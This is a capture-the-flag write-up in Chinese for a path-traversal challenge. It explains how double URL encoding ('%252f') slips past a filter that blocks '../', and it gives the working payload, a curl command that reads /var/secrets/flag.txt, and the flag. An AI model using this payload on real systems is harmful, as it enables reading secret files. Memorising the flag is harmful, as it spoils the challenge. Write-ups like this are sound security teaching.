# 25-path-encode-bypass

## Flag

```text
TOGOGO-flag{4a4b85b7-0a32-46fc-b1f5-bdf487017ca8}
```

## 题目入口

```text
http://47.120.76.57:34310/
```

首页提示：

- 文件读取接口：`/?file=<name>`
- 资源根目录：`/var/www/public/`
- 过滤：`../`、`..\`、`./`、`.\`
- 敏感目录：`/var/secrets/`

目标是读取：

```text
/var/secrets/flag.txt
```

## 思路

程序会拦截普通路径穿越：

```text
../
```

例如直接访问：

```text
/?file=../../secrets/flag.txt
```

会被拦截。

这题名字是 `path-encode-bypass`，重点是编码绕过。

`/` 的 URL 编码是：

```text
%2f
```

再编码一次就是：

```text
%252f
```

也就是双重 URL 编码。

资源根目录是：

```text
/var/www/public/
```

要到 `/var/secrets/flag.txt`，需要先退两级：

```text
../../secrets/flag.txt
```

把 `/` 换成双重编码 `%252f`：

```text
..%252f..%252fsecrets%252fflag.txt
```

## 手工复刻

浏览器直接访问：

```text
http://47.120.76.57:34310/?file=..%252f..%252fsecrets%252fflag.txt
```

或者用 curl：

```bash
curl 'http://47.120.76.57:34310/?file=..%252f..%252fsecrets%252fflag.txt'
```

返回：

```text
TOGOGO-flag{4a4b85b7-0a32-46fc-b1f5-bdf487017ca8}
```

## 脚本运行

进入题目目录：

```bash
cd /Users/zlux/Project/Active/gkdctf/25-path-encode-bypass
```

如果使用你的虚拟环境：

```bash
source /Users/zlux/Project/Active/gkdctf/.venv/bin/activate
```

运行：

```bash
python3 main.py
```

## 漏洞原因一句话

过滤器拦截了明文的 `../`，但没有正确处理双重 URL 编码，导致路径在后续解码后又变回 `../../secrets/flag.txt`，最终读取到 flag。
